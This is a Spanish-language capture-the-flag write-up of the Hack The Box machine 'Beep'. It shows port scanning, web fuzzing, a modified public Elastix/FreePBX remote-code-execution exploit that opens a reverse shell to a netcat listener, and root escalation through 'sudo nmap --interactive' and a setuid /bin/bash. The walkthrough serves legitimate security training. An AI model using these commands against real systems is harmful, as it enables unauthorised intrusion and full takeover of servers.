---
layout: single
title: Beep - Hack The Box
excerpt: "Esta máquina es facil, hay bastantes maneras de poder vulnerar esta máquina, la que haremos sera usar un exploit que nos conecte de manera remota a la máquina, sera configurado y modificado para que sea aceptado pues la pagina web que esta activa en el puerto 80 tiene ya expirado su certificado SSL. Una vez dentro usaremos los permisos que tenemos para convertirnos en Root usando la herramienta nmap tal y como lo menciona el exploit."
date: 2023-02-15
classes: wide
header:
  teaser: /assets/images/htb-writeup-beep/beep_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Linux
  - Elastix 
  - Remote Code Execution (RCE)
  - SUDO Exploitation
---
![](/assets/images/htb-writeup-beep/beep_logo.png)
Esta máquina es facil, hay bastantes maneras de poder vulnerar esta máquina, la que haremos sera usar un exploit que nos conecte de manera remota a la máquina, sera configurado y modificado para que sea aceptado pues la pagina web que esta activa en el puerto 80 tiene ya expirado su certificado SSL. Una vez dentro usaremos los permisos que tenemos para convertirnos en Root usando la herramienta nmap tal y como lo menciona el exploit.

## Traza ICMP
Vamos a realizar un ping para saber si la máquina esta conectada y vamos a analizar el TTL para saber que SO tiene dicha máquina.
```
ping -c 4 10.10.10.7 
PING 10.10.10.7 (10.10.10.7) 56(84) bytes of data.
64 bytes from 10.10.10.7: icmp_seq=1 ttl=63 time=137 ms
64 bytes from 10.10.10.7: icmp_seq=2 ttl=63 time=138 ms
64 bytes from 10.10.10.7: icmp_seq=3 ttl=63 time=136 ms
64 bytes from 10.10.10.7: icmp_seq=4 ttl=63 time=140 ms

--- 10.10.10.7 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3025ms
rtt min/avg/max/mdev = 135.993/137.635/139.741/1.376 ms
```
Estamos contra una máquina con Linux, interesante. Ahora vamos a realizar los escaneos.

## Escaneo de Puertos
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.7 -oG allPorts            
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-15 20:51 CST
Initiating SYN Stealth Scan at 20:51
Scanning 10.10.10.7 [65535 ports]
Discovered open port 995/tcp on 10.10.10.7
Discovered open port 110/tcp on 10.10.10.7
Discovered open port 80/tcp on 10.10.10.7
Discovered open port 993/tcp on 10.10.10.7
Discovered open port 111/tcp on 10.10.10.7
Discovered open port 25/tcp on 10.10.10.7
Discovered open port 22/tcp on 10.10.10.7
Discovered open port 3306/tcp on 10.10.10.7
Discovered open port 443/tcp on 10.10.10.7
Discovered open port 143/tcp on 10.10.10.7
Discovered open port 5038/tcp on 10.10.10.7
Discovered open port 878/tcp on 10.10.10.7
Completed SYN Stealth Scan at 20:52, 37.91s elapsed (65535 total ports)
Nmap scan report for 10.10.10.7
Host is up, received user-set (0.45s latency).
Scanned at 2023-02-15 20:51:30 CST for 38s
Not shown: 45619 filtered tcp ports (no-response), 19904 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
25/tcp   open  smtp    syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
110/tcp  open  pop3    syn-ack ttl 63
111/tcp  open  rpcbind syn-ack ttl 63
143/tcp  open  imap    syn-ack ttl 63
443/tcp  open  https   syn-ack ttl 63
878/tcp  open  unknown syn-ack ttl 63
993/tcp  open  imaps   syn-ack ttl 63
995/tcp  open  pop3s   syn-ack ttl 63
3306/tcp open  mysql   syn-ack ttl 63
5038/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 38.05 seconds
           Raw packets sent: 177474 (7.809MB) | Rcvd: 20100 (804.176KB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Ufff muchos puertos abiertos, tenemos bastantillo que investigar, aunque ya vi unos servicios conocidos como el ssh, el rcbind y el puerto http, veamos que show con los demás servicios.

## Escaneo de Servicios
```
nmap -sC -sV -p22,25,80,110,111,143,443,878,993,995,3306,5038 10.10.10.7 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-15 20:55 CST
Stats: 0:03:03 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.00% done; ETC: 20:59 (0:00:04 remaining)
Nmap scan report for 10.10.10.7
Host is up (0.14s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 adee5abb6937fb27afb83072a0f96f53 (DSA)
|_  2048 bcc6735913a18a4b550750f6651d6d0d (RSA)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp   open  http     Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp  open  pop3     Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: APOP IMPLEMENTATION(Cyrus POP3 server v2) STLS USER AUTH-RESP-CODE PIPELINING UIDL RESP-CODES TOP LOGIN-DELAY(0) EXPIRE(NEVER)
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp  open  imap     Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: Completed OK THREAD=ORDEREDSUBJECT URLAUTHA0001 NAMESPACE X-NETSCAPE LIST-SUBSCRIBED ID MAILBOX-REFERRALS LISTEXT IMAP4rev1 CONDSTORE IDLE CATENATE UNSELECT UIDPLUS ANNOTATEMORE THREAD=REFERENCES SORT ATOMIC RENAME SORT=MODSEQ STARTTLS LITERAL+ CHILDREN IMAP4 QUOTA NO RIGHTS=kxte BINARY ACL MULTIAPPEND
443/tcp  open  ssl/http Apache httpd 2.2.3 ((CentOS))
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2023-03-30T02:56:54+00:00; +2s from scanner time.
|_http-server-header: Apache/2.2.3 (CentOS)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Elastix - Login page
878/tcp  open  status   1 (RPC #100024)
993/tcp  open  ssl/imap Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp  open  pop3     Cyrus pop3d
3306/tcp open  mysql    MySQL (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 1.1
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Host script results:
|_clock-skew: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 245.95 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Ok, para empezar no tenemos ninguna credencial para el servicio SSH por lo que es el primero que descartamos, podriamos iniciar viendo que es ese servicio de **Postfix smtpd** y despues la pagina web del puerto http. De ahi en adelante tambien podriamos investigar el servicio **Cyrus pop3d**. Bueno empecemos a investigar pues.

## Investigación de Servicios
Vamos a iniciar con el **Postfix smtpd**:

**Postfix es un agente de transporte de mensajes (MTA) de última generación, también conocido como servidor SMTP, que tiene dos propósitos: Es responsable de transportar mensajes de correo electrónico desde un cliente de correo / agente de usuario de correo (MUA) a un servidor SMTP remoto. **

No tenemos una versión y de hecho busque con **Searchsploit** para saber si habia algo pero no, no mostro ningun resultado:
```
searchsploit Postfix smtpd                                                                                                              
Exploits: No Results
Shellcodes: No Results
Papers: No Results
```
Entonces vamos a descartar este servicio de momento y pasemos a analizar la pagina web.

**IMPORTANTE**, tuve problemas para entrar pues salia el error **SSL_ERROR_UNSUPPORTED_VERSION**, el sig. link explica como resolverlo, echale un ojo: 

https://stackoverflow.com/questions/63111167/ssl-error-unsupported-version-when-attempting-to-debug-with-iis-express

Muy bien, ya estamos dentro:

![](/assets/images/htb-writeup-beep/Captura1.png)

Aparece el nombre **Elastix**, investiguemos que es eso:

**Elastix es un software de servidor de comunicaciones unificadas que reúne PBX IP, correo electrónico, mensajería instantánea, fax y funciones colaborativas. Cuenta con una interfaz Web e incluye capacidades como un software de centro de llamadas con marcación predictiva**

Mmmmm entonces podemos entrar directamente a la máquina para poder encontrar las flags una vez que lo vulneremos, o bueno eso pienso. Veamos que nos dice **Wappalizer**:

![](/assets/images/htb-writeup-beep/Captura2.png)

Usan PHP, entonces podemos hacer un fuzzing para ver que otras subpaginas hay, pero antes de hacerlo, probemos si sirven las credenciales por defecto que tiene el servicio **Elastix**, las credenciales son:
* eLaStIx.
* 2oo7

No sirvieron, bueno hagamos el fuzzeo:

```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.7/FUZZ.php/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.7/FUZZ.php/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                     
=====================================================================

000000001:   302        9 L      26 W       278 Ch      "# directory-list-2.3-medium.txt"                                           
000000007:   302        9 L      26 W       278 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"           
000000015:   302        9 L      26 W       288 Ch      "index"                                                                     
000000031:   302        9 L      26 W       287 Ch      "logo"                                                                      
000000063:   302        9 L      26 W       290 Ch      "archive"                                                                   
000000085:   302        9 L      26 W       287 Ch      "info"                                                                      
000000084:   302        9 L      26 W       292 Ch      "resources"                                                                 
000000083:   302        9 L      26 W       288 Ch      "icons"                                                                     
000000082:   302        9 L      26 W       291 Ch      "services"                                                                  
000000081:   302        9 L      26 W       292 Ch      "templates"                                                                 
000000080:   302        9 L      26 W       288 Ch      "media"
...
```
Wow, wow, wow, salieron demasiados codigos de estado 302, este codigo quiere decir que el recurso solicitado ha sido movido temporalmente a la URL dada por las cabeceras Location (en-US), osea que no podremos accesar a ellos.

Entonces no creo que podamos hacer mucho, busquemos directamente un exploit para este servicio.

## Buscando y Probando un Exploit
```
searchsploit elastix      
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                                                                      | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                    | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                              | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                           | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                                          | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                                         | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                     | php/webapps/18650.py
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Hay varios que me gustaria probar como el LFI, XSS y PHP Code Injection, pero creo que seria mejor si probamos con el RCE. Vamos a analizar y despues los demás.

### Probando el Exploit: Elastix 2.2.0 - Remote Code Execution
```
searchsploit -x php/webapps/18650.py     
  Exploit: FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/18650
     Path: /usr/share/exploitdb/exploits/php/webapps/18650.py
    Codes: OSVDB-80544, CVE-2012-4869
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (418)
```
Parece que este exploit nos mete directamente usando la url para inyectar un payload que sera una Reverse Shell, esto ya es automatizado, solamente tendriamos que poner la IP de la maquina, nuestra IP y el puerto al que nos conectara, osease una netcat. Vamos a probarlo:
```
rhost="10.10.10.7"
lhost="Tu_IP"
lport=443
```
Cambia esos datos y corre el script con python2 y...nada, no me conecto a nada y no salio nada en la pagina. Supongo que es por el problema que tuve antes para poder entrar a la pagina, pues el certificado SSL parece ya no servir, quiza si lo modificamos puede que apruebe el exploit y sirva, vamos a investigar un poco como podemos modificarlo.

Durante la busqueda, encontre un github que justamente cambia el exploit para que este opere bien:
https://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution

Para modificar el exploit se debe buscar una extension que sirva con el servicio FreePBX que esta relacionado con el servicio Elastix de esta máquina, pero que es FreePBX?

**FreePBX es una GUI de código abierto basado en Web que controla y dirige Asterisk. También se incluye como una pieza clave de otras distribuciones como Elastix, Trixbox y AsteriskNOW.**

Entonces como el certificado SSL ya no sirve, por consiguiente la extension del exploit tampoco (que es la extension 1000), entonces usaremos otra extension disponible para poder conectarnos al servidor y que con esto sirva el exploit.

Para buscar una extension es necesario el paquete de herramientas **sipvicious**, de aqui usaremos la herramienta **svwar**, esta herramienta identifica las líneas de extensión en funcionamiento en un PBX. También le dice si la línea de extensión requiere autenticación o no.

Claro que en este caso ya no es necesario, pues ya hay una extension que sirve dentro del exploit modificado en el github, lo unico que tenemos que hacer es copiar los cambios, osea, la extension, las 3 lineas de codigo abajo de la extension y agregar el context al urlopen.

Ahora si, levantamos la netcat otra vez:
```
nc -nvlp 443
listening on [any] 443 ...
```
* Corremos el exploit:
```
python2 Exploit_Elastix1.py
```
* Y ya estamos dentro:
```
nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.7] 49122
whoami
asterisk
id
uid=100(asterisk) gid=101(asterisk)
```
Bueno y ahora que? El mismo exploit nos indica que hacer y es activar el nmap con sudo de forma interactiva, para poder usar nmap desde la consola y no como comando, solamente escribimos !sh y podremos escalar privilegios para ser root:
```
sudo nmap --interactive
Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
whoami
root
```
Ya solo es buscar las flags que la del root se encuentra en **/root** y la del usuario en **/home**. PEROOOO, que tal si vemos de que otra forma podemos explotar la maquina? Es hora de experimentar.

Lo que hicmos fue abusar de los privilegios que tiene el usuarios **Asterisk** que como ya vimos esta ligado al servicio Elastix y FreePBX, pero que es este usuario?

**Asterisk es un programa de software libre que proporciona funcionalidades de una central telefónica.** Osea que por defecto, tiene ciertos privilegios para poder operar.

Con el comando **sudo -l** podemos ver que permisos como root tiene dicho usuario **Asterisk**:
```
sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"
User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
```
Vaya, vaya, tenemos varios permisos como root. Existe una pagina muy util que nos ayudara en este caso para ver de que otra forma podemos escalar privilegios para convertirnos en **Root**. Esta pagina es GTFOBins: https://gtfobins.github.io/

Entonces veamos de que formas podemos escalar para ser **Root**, ojito que incluso ahi se ve el nmap que fue el que uso el exploit para convertirnos en Root, asi que PROBEMOS OTROS!!

* Probando CHMOD:
```
ls -l /bin/bash
-rwxr-xr-x 1 root root 729292 Jan 22  2009 /bin/bash
sudo chmod u+s /bin/bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 729292 Jan 22  2009 /bin/bash
bash -p
id
uid=100(asterisk) gid=101(asterisk) euid=0(root)
whoami
root
```
Por lo que lei en GTFOBins, se puede escalar usando chown, yum y service. Intentalo!

<!--
## Probando el Exploit: Elastix 2.2.0 - 'graph.php' Local File Inclusion
```
searchsploit -x php/webapps/18650.py                                                                               
  Exploit: FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/18650
     Path: /usr/share/exploitdb/exploits/php/webapps/18650.py
    Codes: OSVDB-80544, CVE-2012-4869
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (418)
```
Es curioso este exploit, el problema es que esta hecho en perl, otro lenguaje que no domino ni conozco, intente correrlo y me marco muchos errores. Voy a intentar buscarlo por internet a ver si hay alguna explicación de como usarlo, aunque se me hace que podemos probar con **BurpSuite** cambiando la data como con la máquina **Bounty Hunter**. Vamos a intentarlo a ver que pasa:

-->

## Links de Investigación
* https://stackoverflow.com/questions/63111167/ssl-error-unsupported-version-when-attempting-to-debug-with-iis-express
* https://www.exploit-db.com/exploits/18650
* https://www.offsec.com/vulndev/freepbx-exploit-phone-home/
* https://www.kali.org/tools/sipvicious/
* https://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution
* https://gtfobins.github.io/

# FIN
